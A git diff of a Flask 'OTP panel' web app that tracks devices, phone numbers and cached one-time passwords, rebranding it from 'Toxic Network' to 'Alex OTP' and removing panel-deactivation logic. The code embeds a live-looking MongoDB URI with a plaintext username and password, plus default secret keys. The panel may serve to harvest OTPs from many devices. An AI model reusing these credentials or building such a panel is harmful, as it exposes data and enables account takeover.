@@ -1,3 +1,4 @@
+
 from flask import Flask, request, jsonify, session, redirect, url_for, Response
 from functools import wraps
 from pymongo import MongoClient
@@ -13,7 +14,7 @@ from collections import Counter
 from datetime import datetime, timezone, timedelta
 
 app = Flask(__name__)
-app.secret_key = os.environ.get("SECRET_KEY", "toxic_otp_secret_2025_v24_1")
+app.secret_key = os.environ.get("SECRET_KEY", "alex_otp_secret_2025_v23_3")
 
 MONGO_URI = os.environ.get("MONGO_URI", "mongodb+srv://gogo_db_user:4DfbHqcjpjg6TYb8@firebase.snn8z2u.mongodb.net")
 BG_REFRESH_INTERVAL = 60
@@ -25,7 +26,7 @@ MAX_PARALLEL = 15
 MAX_DEVICES_PER_FB = 300
 IST = timezone(timedelta(hours=5, minutes=30))
 
-FB_HASH_SALT = os.environ.get("FB_HASH_SALT", "toxic_fb_secure_salt_2025_v24")
+FB_HASH_SALT = os.environ.get("FB_HASH_SALT", "alex_fb_secure_salt_2025_v23")
 
 MONGO_OK = False
 mongo_client = None
@@ -92,71 +93,6 @@ def set_pwd(role, value):
         return False
 
 
-# ==================== PANEL STATE HELPERS ====================
-def get_setting(key, default=None):
-    if not MONGO_OK:
-        return default
-    try:
-        doc = settings_collection.find_one({"_id": key})
-        if doc is not None and "value" in doc:
-            return doc["value"]
-    except Exception:
-        pass
-    return default
-
-
-def set_setting(key, value):
-    if not MONGO_OK:
-        return False
-    try:
-        settings_collection.update_one(
-            {"_id": key},
-            {"$set": {"value": value, "updated_at": int(time.time())}},
-            upsert=True,
-        )
-        return True
-    except Exception as e:
-        print(f"set_setting error: {e}")
-        return False
-
-
-def get_user_panel_state():
-    """Returns the current state of the user panel."""
-    active_str = str(get_setting("user_panel_active", "true")).lower()
-    try:
-        expires_at = int(get_setting("user_panel_expires_at", 0) or 0)
-    except Exception:
-        expires_at = 0
-    passwordless_str = str(get_setting("passwordless_mode", "false")).lower()
-    try:
-        pl_expires_at = int(get_setting("passwordless_expires_at", 0) or 0)
-    except Exception:
-        pl_expires_at = 0
-
-    now = int(time.time())
-    active = active_str in ("true", "1", "yes")
-    if active and expires_at > 0 and now >= expires_at:
-        active = False
-        set_setting("user_panel_active", "false")
-        set_setting("user_panel_expires_at", 0)
-        expires_at = 0
-
-    passwordless = passwordless_str in ("true", "1", "yes")
-    if passwordless and pl_expires_at > 0 and now >= pl_expires_at:
-        passwordless = False
-        set_setting("passwordless_mode", "false")
-        set_setting("passwordless_expires_at", 0)
-        pl_expires_at = 0
-
-    return {
-        "active": active,
-        "expires_at": expires_at if active else 0,
-        "passwordless": passwordless,
-        "passwordless_expires_at": pl_expires_at if passwordless else 0,
-        "now": now,
-    }
-
-
 cache = {
     "numbers_map": {},
     "devices": {},
@@ -171,6 +107,7 @@ cache = {
     "inbox_locks": {},
     "otp_cache": {},
     "otp_cache_time": {},
+    # ✅ Per-firebase stats cache
     "fb_stats": {},
     "fb_stats_time": 0,
 }
@@ -590,6 +527,7 @@ def merge_numbers_into_cache(devices):
         cache["stats"] = {"total": len(nums), "online": online, "offline": offline, "otp_rate": otp_rate}
 
 
+# ✅ Per-firebase stats fetch (admin ke liye)
 def fetch_fb_stats():
     if not MONGO_OK:
         return
@@ -704,14 +642,6 @@ def login_required(f):
             if request.path.startswith("/api/"):
                 return jsonify({"success": False, "error": "Login required"}), 401
             return redirect(url_for("login_page"))
-        # Check panel state for user role
-        if session.get("role") == "user":
-            state = get_user_panel_state()
-            if not state["active"]:
-                session.clear()
-                if request.path.startswith("/api/"):
-                    return jsonify({"success": False, "error": "Panel deactivated by admin"}), 403
-                return redirect(url_for("login_page"))
         return f(*args, **kwargs)
     return wrapper
 
@@ -727,299 +657,224 @@ def admin_required(f):
     return wrapper
 
 
-# ==================== HACKER CSS ====================
-HACKER_BASE_CSS = """
-*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;font-family:'Courier New','Consolas','SF Mono',ui-monospace,monospace}
-html,body{overscroll-behavior-y:contain;background:#0a0e1a;color:#e0e6ff;min-height:100vh}
+MOBILE_CSS = """
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;font-family:-apple-system,BlinkMacSystemFont,system-ui,sans-serif}
+html,body{overscroll-behavior-y:contain}
 body{padding-bottom:env(safe-area-inset-bottom)}
-input,button,textarea,select{font-size:16px !important;-webkit-appearance:none;border-radius:8px;font-family:inherit}
+input,button,textarea,select{font-size:16px !important;-webkit-appearance:none;border-radius:12px}
 button{touch-action:manipulation;cursor:pointer}
-a{-webkit-tap-highlight-color:transparent;text-decoration:none;color:inherit}
-::selection{background:#00ff41;color:#000}
-::-webkit-scrollbar{width:8px;height:8px}
-::-webkit-scrollbar-track{background:#0a0e1a}
-::-webkit-scrollbar-thumb{background:#1f2937;border-radius:4px}
-::-webkit-scrollbar-thumb:hover{background:#00ff41}
-@keyframes spin{to{transform:rotate(360deg)}}
-@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
-@keyframes glow{0%,100%{box-shadow:0 0 5px #00ff41,0 0 20px rgba(0,255,65,.3)}50%{box-shadow:0 0 15px #00ff41,0 0 40px rgba(0,255,65,.6)}}
-@keyframes scanline{0%{transform:translateY(-100%)}100%{transform:translateY(100vh)}}
-@keyframes flicker{0%,100%{opacity:1}50%{opacity:.85}}
+a{-webkit-tap-highlight-color:transparent}
 """
 
-# ==================== LOGIN PAGE ====================
+# ==================== LOGIN PAGES ====================
 LOGIN_HTML = """<!DOCTYPE html>
-<html lang="en"><head><meta charset="UTF-8"><title>Toxic Network — Access</title>
+<html lang="en"><head><meta charset="UTF-8"><title>Alex OTP Login</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<meta name="theme-color" content="#00ff41">
-<style>""" + HACKER_BASE_CSS + """
-body{display:flex;align-items:center;justify-content:center;padding:20px;background:radial-gradient(ellipse at center,#0a1a0e 0%,#0a0e1a 70%)}
-body::before{content:"";position:fixed;top:0;left:0;right:0;bottom:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,.03) 2px,rgba(0,255,65,.03) 4px);pointer-events:none;z-index:0}
-.box{width:100%;max-width:420px;background:#111827;border:1px solid #1f2937;border-radius:14px;padding:36px 28px;position:relative;z-index:1;box-shadow:0 0 40px rgba(0,255,65,.15),inset 0 0 20px rgba(0,255,65,.03)}
-.box::before{content:"";position:absolute;top:-1px;left:-1px;right:-1px;height:2px;background:linear-gradient(90deg,#00ff41,#00e5ff,#00ff41);border-radius:14px 14px 0 0;animation:glow 2s infinite}
-.logo{text-align:center;margin-bottom:22px}
-.logo-icon{font-size:44px;margin-bottom:10px;display:block;filter:drop-shadow(0 0 12px #00ff41)}
-h1{text-align:center;font-size:18px;margin-bottom:6px;color:#00ff41;letter-spacing:3px;font-weight:900;text-shadow:0 0 10px rgba(0,255,65,.6);animation:flicker 4s infinite}
-p.sub{text-align:center;font-size:11px;color:#4a5270;margin-bottom:26px;letter-spacing:1.5px;text-transform:uppercase}
+<meta name="theme-color" content="#7c3aed">
+<style>""" + MOBILE_CSS + """
+body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#f0f9ff,#e0e7ff);color:#1e293b;padding:20px}
+.box{width:100%;max-width:400px;background:#fff;border-radius:20px;padding:32px 24px;box-shadow:0 20px 60px rgba(99,102,241,.15)}
+h1{text-align:center;font-size:22px;margin-bottom:8px;background:linear-gradient(90deg,#7c3aed,#ec4899);-webkit-background-clip:text;background-clip:text;color:transparent}
+p.sub{text-align:center;font-size:13px;color:#64748b;margin-bottom:24px}
 .pwd-wrap{position:relative}
-input{width:100%;padding:16px 48px 16px 16px;border-radius:8px;border:1.5px solid #1f2937;background:#0a0e1a;color:#e0e6ff;outline:none;transition:.2s;letter-spacing:1px;font-family:'Courier New',monospace}
-input:focus{border-color:#00ff41;box-shadow:0 0 0 3px rgba(0,255,65,.15);background:#050810}
-input::placeholder{color:#4a5270;letter-spacing:1px}
-.toggle-pwd{position:absolute;right:14px;top:50%;transform:translateY(-50%);cursor:pointer;font-size:18px;user-select:none;color:#4a5270;padding:4px}
-.toggle-pwd:hover{color:#00ff41}
-button{width:100%;margin-top:18px;padding:16px;border:none;border-radius:8px;background:linear-gradient(135deg,#00ff41,#00e5ff);color:#0a0e1a;font-weight:900;font-size:14px;cursor:pointer;transition:.2s;min-height:52px;letter-spacing:3px;text-transform:uppercase;font-family:inherit}
-button:hover{box-shadow:0 0 20px rgba(0,255,65,.5);transform:translateY(-1px)}
+input{width:100%;padding:16px 48px 16px 16px;border-radius:12px;border:1.5px solid #e2e8f0;background:#f8fafc;color:#1e293b;outline:none;transition:.2s}
+input:focus{border-color:#8b5cf6;background:#fff;box-shadow:0 0 0 4px rgba(139,92,246,.1)}
+.toggle-pwd{position:absolute;right:14px;top:50%;transform:translateY(-50%);cursor:pointer;font-size:20px;user-select:none;color:#94a3b8;padding:4px}
+button{width:100%;margin-top:16px;padding:16px;border:none;border-radius:12px;background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff;font-weight:600;font-size:16px;cursor:pointer;transition:.2s;min-height:52px}
 button:active{transform:scale(.98)}
-.err{margin-top:14px;text-align:center;color:#ff3860;font-size:12px;letter-spacing:1px;padding:10px;background:rgba(255,56,96,.1);border:1px solid rgba(255,56,96,.3);border-radius:6px}
-.info{margin-top:16px;text-align:center;font-size:10px;color:#4a5270;letter-spacing:1px}
-.info a{color:#00e5ff;border-bottom:1px dotted #00e5ff}
-.status-banner{margin-bottom:16px;padding:10px 12px;border-radius:6px;font-size:11px;letter-spacing:1px;text-align:center;font-family:'Courier New',monospace}
-.status-banner.active{background:rgba(0,255,65,.1);border:1px solid rgba(0,255,65,.3);color:#00ff41}
-.status-banner.temp{background:rgba(255,215,0,.1);border:1px solid rgba(255,215,0,.3);color:#ffd700}
-.status-banner.pls{background:rgba(0,229,255,.1);border:1px solid rgba(0,229,255,.3);color:#00e5ff}</style></head><body>
-<form class="box" method="POST">
-<div class="logo"><span class="logo-icon">☣️</span></div>
-<h1>TOXIC NETWORK</h1>
-<p class="sub">▸ SECURE ACCESS TERMINAL ◂</p>
-__BANNER__
+.err{margin-top:14px;text-align:center;color:#ef4444;font-size:13px}
+.lock{text-align:center;font-size:40px;margin-bottom:12px}</style></head><body>
+<form class="box" method="POST"><div class="lock">📲</div><h1>ALEX OTP PANEL</h1>
+<p class="sub">Enter password to continue</p>
 <div class="pwd-wrap">
-<input type="password" id="pwd" name="password" placeholder="ENTER ACCESS KEY" required autofocus>
-<span class="toggle-pwd" onclick="togglePwd(event)">👁</span>
+<input type="password" id="pwd" name="password" placeholder="Password" required autofocus>
+<span class="toggle-pwd" onclick="togglePwd(event)">👁️</span>
 </div>
-<button type="submit">▶ INITIALIZE</button>__ERROR__
-<div class="info">🛡 PROTECTED SYSTEM · v24.1</div>
-</form>
+<button type="submit">Login</button>__ERROR__</form>
 <script>
 function togglePwd(e){
-  var i=document.getElementById('pwd');var t=e.target;
+  var i=document.getElementById('pwd');
+  var t=e.target;
   if(i.type==='password'){i.type='text';t.textContent='🙈';}
-  else{i.type='password';t.textContent='👁';}
+  else{i.type='password';t.textContent='👁️';}
 }
 </script>
 </body></html>"""
 
-
-# ==================== ADMIN LOGIN ====================
 ADMIN_LOGIN_HTML = """<!DOCTYPE html>
-<html lang="en"><head><meta charset="UTF-8"><title>Toxic Network — ROOT</title>
+<html lang="en"><head><meta charset="UTF-8"><title>Alex Admin Login</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<meta name="theme-color" content="#ff3860">
-<style>""" + HACKER_BASE_CSS + """
-body{display:flex;align-items:center;justify-content:center;padding:20px;background:radial-gradient(ellipse at center,#1a0a0e 0%,#0a0004 70%)}
-body::before{content:"";position:fixed;top:0;left:0;right:0;bottom:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(255,56,96,.03) 2px,rgba(255,56,96,.03) 4px);pointer-events:none;z-index:0}
-.box{width:100%;max-width:420px;background:#1a0f14;border:1px solid #2a1010;border-radius:14px;padding:36px 28px;position:relative;z-index:1;box-shadow:0 0 40px rgba(255,56,96,.15),inset 0 0 20px rgba(255,56,96,.03)}
-.box::before{content:"";position:absolute;top:-1px;left:-1px;right:-1px;height:2px;background:linear-gradient(90deg,#ff3860,#ff9500,#ff3860);border-radius:14px 14px 0 0;animation:glow 2s infinite;box-shadow:0 0 15px #ff3860}
-.logo{text-align:center;margin-bottom:22px}
-.logo-icon{font-size:44px;margin-bottom:10px;display:block;filter:drop-shadow(0 0 12px #ff3860)}
-h1{text-align:center;font-size:18px;margin-bottom:6px;color:#ff3860;letter-spacing:3px;font-weight:900;text-shadow:0 0 10px rgba(255,56,96,.6);animation:flicker 4s infinite}
-p.sub{text-align:center;font-size:11px;color:#5a3040;margin-bottom:26px;letter-spacing:1.5px;text-transform:uppercase}
+<meta name="theme-color" content="#1e293b">
+<style>""" + MOBILE_CSS + """
+body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#1e293b,#0f172a);color:#e2e8f0;padding:20px}
+.box{width:100%;max-width:400px;background:#1e293b;border:1px solid #334155;border-radius:20px;padding:32px 24px;box-shadow:0 20px 60px rgba(0,0,0,.5)}
+h1{text-align:center;font-size:22px;margin-bottom:8px;background:linear-gradient(90deg,#f59e0b,#ef4444);-webkit-background-clip:text;background-clip:text;color:transparent}
+p.sub{text-align:center;font-size:13px;color:#94a3b8;margin-bottom:24px}
 .pwd-wrap{position:relative}
-input{width:100%;padding:16px 48px 16px 16px;border-radius:8px;border:1.5px solid #2a1010;background:#0a0004;color:#e0e6ff;outline:none;transition:.2s;letter-spacing:1px;font-family:'Courier New',monospace}
-input:focus{border-color:#ff3860;box-shadow:0 0 0 3px rgba(255,56,96,.15);background:#050002}
-input::placeholder{color:#5a3040;letter-spacing:1px}
-.toggle-pwd{position:absolute;right:14px;top:50%;transform:translateY(-50%);cursor:pointer;font-size:18px;user-select:none;color:#5a3040;padding:4px}
-.toggle-pwd:hover{color:#ff3860}
-button{width:100%;margin-top:18px;padding:16px;border:none;border-radius:8px;background:linear-gradient(135deg,#ff3860,#ff9500);color:#0a0004;font-weight:900;font-size:14px;cursor:pointer;transition:.2s;min-height:52px;letter-spacing:3px;text-transform:uppercase;font-family:inherit}
-button:hover{box-shadow:0 0 20px rgba(255,56,96,.5);transform:translateY(-1px)}
+input{width:100%;padding:16px 48px 16px 16px;border-radius:12px;border:1.5px solid #334155;background:#0f172a;color:#e2e8f0;outline:none;transition:.2s}
+input:focus{border-color:#f59e0b;box-shadow:0 0 0 4px rgba(245,158,11,.15)}
+.toggle-pwd{position:absolute;right:14px;top:50%;transform:translateY(-50%);cursor:pointer;font-size:20px;user-select:none;color:#94a3b8;padding:4px}
+button{width:100%;margin-top:16px;padding:16px;border:none;border-radius:12px;background:linear-gradient(135deg,#f59e0b,#ef4444);color:#fff;font-weight:600;font-size:16px;cursor:pointer;transition:.2s;min-height:52px}
 button:active{transform:scale(.98)}
-.err{margin-top:14px;text-align:center;color:#ff3860;font-size:12px;letter-spacing:1px;padding:10px;background:rgba(255,56,96,.1);border:1px solid rgba(255,56,96,.3);border-radius:6px}
-.info{margin-top:16px;text-align:center;font-size:10px;color:#5a3040;letter-spacing:1px}</style></head><body>
-<form class="box" method="POST">
-<div class="logo"><span class="logo-icon">☠️</span></div>
-<h1>ROOT ACCESS</h1>
-<p class="sub">▸ SUPERMASTERADMIN ◂</p>
+.err{margin-top:14px;text-align:center;color:#ef4444;font-size:13px}
+.lock{text-align:center;font-size:40px;margin-bottom:12px}</style></head><body>
+<form class="box" method="POST"><div class="lock">🔐</div><h1>ADMIN PANEL</h1>
+<p class="sub">Enter admin password</p>
 <div class="pwd-wrap">
-<input type="password" id="pwd" name="password" placeholder="ROOT KEY" required autofocus>
-<span class="toggle-pwd" onclick="togglePwd(event)">👁</span>
+<input type="password" id="pwd" name="password" placeholder="Admin Password" required autofocus>
+<span class="toggle-pwd" onclick="togglePwd(event)">👁️</span>
 </div>
-<button type="submit">⚡ ESCALATE</button>__ERROR__
-<div class="info">🔒 CLASSIFIED · LEVEL 99</div>
-</form>
+<button type="submit">Admin Login</button>__ERROR__</form>
 <script>
 function togglePwd(e){
-  var i=document.getElementById('pwd');var t=e.target;
+  var i=document.getElementById('pwd');
+  var t=e.target;
   if(i.type==='password'){i.type='text';t.textContent='🙈';}
-  else{i.type='password';t.textContent='👁';}
+  else{i.type='password';t.textContent='👁️';}
 }
 </script>
 </body></html>"""
 
 
-# ==================== PANEL OFFLINE PAGE ====================
-PANEL_OFFLINE_HTML = """<!DOCTYPE html>
-<html lang="en"><head><meta charset="UTF-8"><title>Toxic Network — OFFLINE</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<meta http-equiv="refresh" content="15">
-<meta name="theme-color" content="#ff3860">
-<style>""" + HACKER_BASE_CSS + """
-body{display:flex;align-items:center;justify-content:center;padding:20px;background:radial-gradient(ellipse at center,#1a0a0e 0%,#0a0004 70%)}
-body::before{content:"";position:fixed;top:0;left:0;right:0;bottom:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(255,56,96,.05) 2px,rgba(255,56,96,.05) 4px);pointer-events:none;z-index:0}
-.box{width:100%;max-width:420px;background:#1a0f14;border:1px solid #ff3860;border-radius:14px;padding:36px 28px;position:relative;z-index:1;text-align:center;box-shadow:0 0 60px rgba(255,56,96,.3)}
-.icon{font-size:64px;margin-bottom:16px;display:block;animation:pulse 1.5s infinite;filter:drop-shadow(0 0 20px #ff3860)}
-h1{color:#ff3860;font-size:22px;letter-spacing:4px;margin-bottom:14px;font-weight:900;text-shadow:0 0 15px rgba(255,56,96,.7);animation:flicker 3s infinite}
-p{color:#8a6070;font-size:12px;line-height:1.7;letter-spacing:1px;margin-bottom:8px}
-.hint{margin-top:20px;padding:14px;background:rgba(255,56,96,.08);border:1px solid rgba(255,56,96,.25);border-radius:8px;font-size:11px;color:#ff9500;letter-spacing:1px}
-.pulse{display:inline-block;width:8px;height:8px;border-radius:50%;background:#ff3860;margin-right:6px;animation:pulse 1s infinite;box-shadow:0 0 10px #ff3860}</style></head><body>
-<div class="box">
-<span class="icon">🚫</span>
-<h1>ACCESS DENIED</h1>
-<p>▸ USER PANEL TEMPORARILY OFFLINE ◂</p>
-<p style="margin-top:14px;font-size:11px">Administrator ne panel deactivate kar diya hai.</p>
-<p style="font-size:11px">Thodi der me wapas try karein.</p>
-<div class="hint"><span class="pulse"></span>AUTO-RETRY ACTIVE · 15s</div>
-</div>
-</body></html>"""
-
-
-# ==================== USER DASHBOARD (Toxic Matrix Green) ====================
+# ==================== USER DASHBOARD ====================
 USER_DASHBOARD_HTML = r"""<!DOCTYPE html>
-<html lang="en"><head><meta charset="UTF-8"><title>Toxic Network — OTP Panel</title>
+<html lang="en"><head><meta charset="UTF-8"><title>Alex OTP Panel</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<meta name="theme-color" content="#00ff41">
-<style>""" + HACKER_BASE_CSS + r"""
-body{background:#0a0e1a;color:#e0e6ff;padding:0 0 40px;background-image:radial-gradient(ellipse at top,#0a1a0e 0%,#0a0e1a 60%)}
-.topbar{background:#0a0e1a;border-bottom:1px solid #1f2937;padding:10px 14px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;flex-wrap:wrap;gap:8px;padding-top:calc(10px + env(safe-area-inset-top));box-shadow:0 2px 20px rgba(0,255,65,.08)}
-.brand{font-size:16px;font-weight:900;letter-spacing:2px;flex-shrink:0}
-.brand .toxic{background:linear-gradient(90deg,#00ff41,#00e5ff);-webkit-background-clip:text;background-clip:text;color:transparent;text-shadow:0 0 15px rgba(0,255,65,.3)}
-.brand .net{color:#e0e6ff}
-.top-actions{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
-.refresh-btn{background:linear-gradient(135deg,#00ff41,#00e5ff);color:#0a0e1a;border:none;width:42px;height:42px;border-radius:8px;font-size:18px;display:flex;align-items:center;justify-content:center;box-shadow:0 0 15px rgba(0,255,65,.4);transition:.2s;padding:0;font-weight:900}
+<meta name="theme-color" content="#7c3aed">
+<style>""" + MOBILE_CSS + r"""
+body{background:#f7f8fc;color:#1e293b;min-height:100vh;padding:0 0 40px}
+.topbar{background:#fff;padding:10px 14px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;box-shadow:0 1px 3px rgba(0,0,0,.05);flex-wrap:wrap;gap:8px;padding-top:calc(10px + env(safe-area-inset-top))}
+.brand{font-size:17px;font-weight:800;letter-spacing:-.5px;flex-shrink:0}
+.brand .alex{background:linear-gradient(90deg,#7c3aed,#ec4899);-webkit-background-clip:text;background-clip:text;color:transparent}
+.brand .panel{color:#1e293b}
+.top-actions{display:flex;align-items:center;gap:8px}
+.refresh-btn{background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff;border:none;width:42px;height:42px;border-radius:50%;font-size:18px;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 12px rgba(124,58,237,.3);transition:.2s;padding:0}
 .refresh-btn:active{transform:scale(.9) rotate(180deg)}
 .refresh-btn.spinning{animation:spin 1s linear infinite}
-.conn{display:flex;align-items:center;gap:6px;font-size:10px;font-weight:700;padding:6px 10px;border-radius:6px;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
-.conn.online{color:#00ff41;background:rgba(0,255,65,.1);border:1px solid rgba(0,255,65,.3)}
-.conn.offline{color:#ff3860;background:rgba(255,56,96,.1);border:1px solid rgba(255,56,96,.3)}
-.conn.loading{color:#ffd700;background:rgba(255,215,0,.1);border:1px solid rgba(255,215,0,.3)}
-.conn .dot{width:7px;height:7px;border-radius:50%;background:currentColor;box-shadow:0 0 8px currentColor}
+@keyframes spin{to{transform:rotate(360deg)}}
+.conn{display:flex;align-items:center;gap:6px;font-size:11px;font-weight:600;padding:6px 10px;border-radius:20px}
+.conn.online{color:#16a34a;background:#dcfce7}
+.conn.offline{color:#dc2626;background:#fee2e2}
+.conn.loading{color:#d97706;background:#fef3c7}
+.conn .dot{width:8px;height:8px;border-radius:50%;background:currentColor}
 .conn.online .dot{animation:pulse 1.5s infinite}
-.logout-btn{background:rgba(255,56,96,.1);color:#ff3860;border:1px solid rgba(255,56,96,.3);padding:10px 12px;border-radius:8px;font-size:11px;font-weight:700;text-decoration:none;min-height:42px;display:inline-flex;align-items:center;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
-.logout-btn:hover{background:rgba(255,56,96,.2)}
-.nav{display:flex;gap:6px;align-items:center;flex-wrap:wrap;order:3;width:100%;justify-content:space-between;margin-top:8px}
-@media(min-width:640px){.nav{order:0;width:auto;margin-top:0}}
-.nav-link{padding:10px 14px;border-radius:8px;text-decoration:none;font-size:11px;font-weight:700;color:#7a85a8;background:#111827;border:1px solid #1f2937;transition:.2s;white-space:nowrap;min-height:44px;display:inline-flex;align-items:center;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
-.nav-link:hover{color:#00ff41;border-color:rgba(0,255,65,.3)}
-.nav-link.active{background:linear-gradient(135deg,#00ff41,#00e5ff);color:#0a0e1a;border-color:transparent;box-shadow:0 0 15px rgba(0,255,65,.4)}
-.nav-link.otp{background:rgba(168,85,247,.1);color:#a855f7;border-color:rgba(168,85,247,.3)}
-.nav-link.otp:hover{background:rgba(168,85,247,.2)}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+.logout-btn{background:#f1f5f9;color:#ef4444;border:none;padding:10px 12px;border-radius:10px;font-size:12px;font-weight:600;text-decoration:none;min-height:42px;display:inline-flex;align-items:center}
+.nav{display:flex;gap:6px;align-items:center;flex-wrap:wrap;order:3;width:100%;justify-content:space-between}
+@media(min-width:640px){.nav{order:0;width:auto}}
+.nav-link{padding:10px 14px;border-radius:10px;text-decoration:none;font-size:13px;font-weight:600;color:#475569;background:#f1f5f9;transition:.2s;white-space:nowrap;min-height:44px;display:inline-flex;align-items:center}
+.nav-link:active{transform:scale(.96)}
+.nav-link.active{background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff}
+.nav-link.otp{background:linear-gradient(135deg,#dcfce7,#bbf7d0);color:#166534}
 .container{max-width:900px;margin:0 auto;padding:14px}
-.session-banner{background:linear-gradient(135deg,rgba(0,255,65,.15),rgba(0,229,255,.15));border:1px solid rgba(0,255,65,.4);border-radius:8px;padding:12px 14px;margin-bottom:14px;display:flex;align-items:center;gap:10px;font-size:12px;letter-spacing:1px;color:#00ff41;font-weight:700;box-shadow:0 0 15px rgba(0,255,65,.2);font-family:'Courier New',monospace}
-.session-banner .pulse{width:8px;height:8px;border-radius:50%;background:#00ff41;box-shadow:0 0 10px #00ff41;animation:pulse 1s infinite;flex-shrink:0}
-.session-banner.temp{background:linear-gradient(135deg,rgba(255,215,0,.15),rgba(255,149,0,.15));border-color:rgba(255,215,0,.4);color:#ffd700;box-shadow:0 0 15px rgba(255,215,0,.2)}
-.session-banner.temp .pulse{background:#ffd700;box-shadow:0 0 10px #ffd700}
 .stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px}
-.stat{background:#111827;border:1px solid #1f2937;border-radius:10px;padding:14px;transition:.3s;position:relative;overflow:hidden}
-.stat::before{content:"";position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,currentColor,transparent);opacity:.5}
-.stat.flash{background:rgba(0,255,65,.05);border-color:rgba(0,255,65,.3)}
-.stat .label{font-size:9px;color:#4a5270;font-weight:700;letter-spacing:2px;text-transform:uppercase;margin-bottom:6px;font-family:'Courier New',monospace}
-.stat .value{font-size:26px;font-weight:900;letter-spacing:-1px;text-shadow:0 0 15px currentColor}
-.stat.total{color:#00e5ff}
-.stat.online{color:#00ff41}
-.stat.offline{color:#ff3860}
-.stat.otp{color:#a855f7}
-.quick{background:#111827;border:1px solid #1f2937;border-radius:10px;padding:14px;margin-bottom:14px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px}
-.quick .info{font-size:12px;color:#7a85a8;letter-spacing:1px;font-family:'Courier New',monospace}
-.quick .info b{color:#00ff41;font-size:14px;text-shadow:0 0 8px rgba(0,255,65,.5)}
+.stat{background:#fff;border-radius:14px;padding:14px;box-shadow:0 2px 8px rgba(99,102,241,.06);transition:.3s}
+.stat.flash{background:#f0fdf4}
+.stat .label{font-size:10px;color:#94a3b8;font-weight:600;letter-spacing:.5px;text-transform:uppercase;margin-bottom:6px}
+.stat .value{font-size:26px;font-weight:800;letter-spacing:-1px}
+.stat.total .value{color:#2563eb}
+.stat.online .value{color:#16a34a}
+.stat.offline .value{color:#dc2626}
+.stat.otp .value{color:#a855f7}
+.quick{background:#fff;border-radius:14px;padding:14px;margin-bottom:14px;display:flex;justify-content:space-between;align-items:center;box-shadow:0 2px 8px rgba(99,102,241,.06);flex-wrap:wrap;gap:10px}
+.quick .info{font-size:13px;color:#475569}
+.quick .info b{color:#1e293b;font-size:15px}
 .filter-live{display:flex;gap:8px;margin-bottom:14px;flex-wrap:wrap}
-.filter-live-btn{flex:1;min-width:130px;padding:14px 12px;border-radius:8px;border:1px solid #1f2937;cursor:pointer;font-size:11px;font-weight:700;display:flex;align-items:center;justify-content:center;gap:6px;transition:.2s;background:#111827;font-family:'Courier New',monospace;min-height:52px;letter-spacing:1px;text-transform:uppercase;color:#7a85a8}
-.filter-live-btn:hover{border-color:#00ff41;color:#00ff41}
-.filter-live-btn.online{color:#00ff41;border-color:rgba(0,255,65,.3)}
-.filter-live-btn.offline{color:#ff3860;border-color:rgba(255,56,96,.3)}
-.filter-live-btn.active-filter{background:linear-gradient(135deg,rgba(0,255,65,.15),rgba(0,229,255,.15));box-shadow:0 0 15px rgba(0,255,65,.3)}
-.filter-live-btn .count-badge{background:rgba(0,0,0,.3);padding:2px 8px;border-radius:4px;font-size:10px;border:1px solid currentColor}
+.filter-live-btn{flex:1;min-width:130px;padding:14px 12px;border-radius:12px;border:2px solid transparent;cursor:pointer;font-size:13px;font-weight:700;text-decoration:none;display:flex;align-items:center;justify-content:center;gap:6px;transition:.2s;background:none;font-family:inherit;min-height:52px}
+.filter-live-btn:active{transform:scale(.97)}
+.filter-live-btn.online{background:linear-gradient(135deg,#dcfce7,#bbf7d0);color:#166534;border-color:#86efac}
+.filter-live-btn.offline{background:linear-gradient(135deg,#fee2e2,#fecaca);color:#991b1b;border-color:#fca5a5}
+.filter-live-btn.active-filter{box-shadow:0 0 0 4px rgba(99,102,241,.3)}
+.filter-live-btn .count-badge{background:rgba(0,0,0,.15);padding:2px 8px;border-radius:10px;font-size:11px}
 .list-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;padding:0 4px;gap:8px;flex-wrap:wrap}
-.list-header h2{font-size:12px;font-weight:700;color:#00ff41;letter-spacing:2px;text-transform:uppercase;font-family:'Courier New',monospace}
-.list-header .count{font-size:11px;color:#00e5ff;background:rgba(0,229,255,.1);border:1px solid rgba(0,229,255,.3);padding:3px 10px;border-radius:4px;font-weight:700;font-family:'Courier New',monospace}
+.list-header h2{font-size:14px;font-weight:700;color:#334155}
+.list-header .count{font-size:12px;color:#64748b;background:#e2e8f0;padding:3px 10px;border-radius:20px;font-weight:600}
 .search-box{margin-bottom:12px}
-.search-box input{width:100%;padding:14px 16px;border-radius:8px;border:1.5px solid #1f2937;background:#111827;outline:none;color:#e0e6ff;letter-spacing:1px;font-family:'Courier New',monospace}
